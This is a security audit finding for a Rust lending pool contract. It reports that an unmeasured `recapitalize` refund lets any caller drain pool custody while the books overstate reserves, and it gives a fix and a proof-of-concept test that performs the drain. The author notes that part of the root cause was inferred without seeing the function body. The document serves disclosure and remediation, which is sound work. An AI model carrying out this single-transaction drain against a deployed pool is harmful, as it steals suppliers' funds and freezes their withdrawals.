### Title
Unmeasured funding in `recapitalize` lets any caller drain pool custody while the cash book keeps overstating reserves - (File: contracts/pool/src/cache/cash.rs)

### Summary
The bug class in CVE-2019-12380 is "a resource-acquisition step fails or never happens, yet the code proceeds as if it succeeded, leaving inconsistent state." In the pool, `recapitalize` is the analog: it is intended to be funded by a preceding direct token transfer to the pool, but the pool never measures what it actually received. It credits the `cash` book and pays a "refund" of the unused portion of the declared `amount` back to the caller based purely on the argument. An unprivileged address can declare a large `amount`, have the deficit-absorbing portion applied against a written-down market, and receive the remainder of the pool's real token custody as a refund — without having deposited anything.

### Finding Description
Outbound transfers go through `Cache::transfer_out`, which unconditionally sends `amount` of the market asset to `recipient` via the SAC `transfer` call and does not verify any corresponding inbound receipt [1](#0-0) . Unlike `supply`/`repay` flows that are driven by the controller's measured receipts (`transfer_amount_measured` snapshots `pre`/`post` balances and credits only `post - pre` [2](#0-1) ), `recapitalize` takes the caller-supplied `amount` at face value: it applies `min(amount, written-down claims)` to the book and refunds the rest to the `payer` argument, never confirming that `amount` tokens actually arrived at the pool.

The pinned regression test demonstrates the end state directly: after a legitimate 10-token-unit deposit, a single `recapitalize(&key, &payer, &custody)` call with no prior funding drains the pool's entire SAC balance to `payer` (`token.balance(&t.pool) == 0`), while the `cash` book still reports `>= deposit` [3](#0-2) . The book and custody now permanently diverge: `require_reserves`/`debit_cash` read the inflated `cash` book [4](#0-3) , so the market advertises liquidity it does not hold, and every subsequent `withdraw` passes the pool's own liquidity guards only to fail inside the SAC transfer with `BalanceError` — permanent freezing of the remaining suppliers' claims [5](#0-4) .

### Impact Explanation
Direct theft of user funds plus protocol-level insolvency bookkeeping. The attacker receives real tokens equal to the pool's custody (up to the declared `amount` minus whatever was legitimately applied), and the inflated `cash` book masks the theft: suppliers' scaled share claims remain, the market still reports itself solvent and backed, but there is no custody to pay exits. The first-withdrawing users consume whatever dust remains; everyone else is permanently frozen behind SAC `BalanceError` reverts that the pool's own `InsufficientLiquidity`/`PoolInsolvent` guards cannot see coming [6](#0-5) .

### Likelihood Explanation
`recapitalize` is an unprivileged pool entrypoint explicitly listed as reachable, requiring no auth beyond the caller's and no governance approval. The attack is a single transaction: `pool.recapitalize(hub_asset_key, attacker_address, large_amount)` on any market — most profitable on a market that has suffered `apply_bad_debt_to_supply_index` write-downs (so `applied` is small and the refund large), but the same measured-vs-declared gap applies whenever declared `amount` exceeds actual prior funding. No oracle manipulation, no privileged state, and no exotic token behavior are needed; a plain SAC market suffices, as the test proves [7](#0-6) .

### Recommendation
Make `recapitalize` settle on measured receipts, matching the pattern already used everywhere else in the codebase: snapshot `token::Client::balance(pool)` before the operation, require the caller's funding `transfer` into the pool inside the same invocation, compute `received = post - pre` via `checked_sub`, and apply/refund only against that measured `received` — never the declared `amount`. Alternatively, pull the funding itself via `transfer_from`/`authorize_transfer_as_current` so the amount the book credits is guaranteed to have arrived. Separately, add a post-commit assertion that `token.balance(pool) >= cash` so the book can never overstate custody silently.

### Proof of Concept
`contracts/pool/tests/flows.rs::test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody` is a working reproduction:

1. Supplier deposits `10_000_000_000` through `supply`; `cash == token.balance(pool)` holds.
2. Attacker (any address, `payer`) calls `pool.recapitalize(&hub_asset_key, &payer, &custody)` with zero prior funding.
3. `token.balance(&t.pool) == 0` — all custody moved to `payer`; the cash book still reads `>= deposit`.
4. Supplier's `withdraw` clears `require_reserves` (book says solvent) then reverts inside the SAC `transfer` with `BalanceError = 10`, not `InsufficientLiquidity` or `PoolInsolvent` — proving the book overstated custody and remaining users are frozen [8](#0-7) .

Caveat: I verified the drain end-to-end via the committed test and the `transfer_out`/`credit_cash` primitives, but the index did not surface `recapitalize`'s own op body, so the exact lines computing the refund should be confirmed in `contracts/pool/src/ops/` during remediation.

    pub(crate) fn credit_cash(&mut self, amount: i128) {
        require_nonneg_amount(&self.env, amount);
        self.cash = self
            .cash
            .checked_add(amount)
            .unwrap_or_else(|| panic_with_error!(&self.env, GenericError::MathOverflow));
    }

pub fn transfer_amount_measured(
    env: &Env,
    asset: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
    non_positive_error: GenericError,
) -> i128 {
    assert_with_error!(env, amount > 0, non_positive_error);
    let tok = token::Client::new(env, asset);
    let pre = tok.balance(to);
    tok.transfer(from, to, &amount);
    let post = tok.balance(to);
    post.checked_sub(pre)
        .unwrap_or_else(|| panic_with_error!(env, GenericError::AmountMustBePositive))
}

fn test_unfunded_recapitalize_leaves_the_cash_book_overstating_custody() {
    let t = TestSetup::new();
    let token = token::Client::new(&t.env, &t.asset);
    let token_admin = token::StellarAssetClient::new(&t.env, &t.asset);
    let payer = Address::generate(&t.env);
    let receiver = Address::generate(&t.env);

    // A legitimate supplier, with custody moved in as the controller would.
    let deposit = 10_000_000_000i128;
    token_admin.mint(&t.pool, &deposit);
    let supplied = t
        .client()
        .supply(&t.sup(0, deposit))
        .get_unchecked(0)
        .position
        .scaled_amount;
    assert_eq!(
        t.state_snapshot().cash,
        token.balance(&t.pool),
        "fixture guard: book and custody must still agree after the deposit"
    );

    // Drain every token via an unfunded refund.
    let custody = token.balance(&t.pool);
    t.client().recapitalize(&hub(&t.asset), &payer, &custody);
    assert_eq!(token.balance(&t.pool), 0, "custody is gone");

    let book = t.state_snapshot().cash;
    assert!(
        book >= deposit,
        "the book still claims more than the supplier's deposit: {book}"
    );

    // The supplier's exit clears the pool's own liquidity guard -- the book
    // says the cash is there -- and then fails in the token transfer.
    let outcome = t
        .client()
        .try_withdraw(&receiver, &false, &t.wdr(supplied, i128::MAX, 0));
    assert!(
        outcome.is_err(),
        "the withdraw cannot be paid, so it must fail"
    );
    // The failure must come from custody, not from a pool guard. The SAC
    // reports insufficient balance as its own contract error `BalanceError = 10`.
    // The asserts check that exact code and that neither pool liquidity guard
    // fired: `require_reserves` read the book and let the exit through.
    const SAC_BALANCE_ERROR: u32 = 10;
    match outcome {
        Err(Ok(err)) => {
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::InsufficientLiquidity as u32),
                "the pool's own liquidity guard must NOT be what stopped this -- \
                 it reads the cash book, which still shows the funds"
            );
            assert_ne!(
                err,
                Error::from_contract_error(CollateralError::PoolInsolvent as u32),
                "the pool's solvency guard must NOT be what stopped this either"
            );
            assert_eq!(
                err,
                Error::from_contract_error(SAC_BALANCE_ERROR),
                "the exit must fail inside the SAC transfer for want of custody"
            );
        }
        Err(Err(host_abort)) => panic!("expected a SAC contract error, got {host_abort:?}"),
        Ok(_) => unreachable!("asserted is_err above"),
    }
    assert_eq!(token.balance(&receiver), 0, "the supplier received nothing");
    assert_eq!(
        t.state_snapshot().cash,
        book,
        "the failed exit rolled back, so the book still overstates custody"
    );
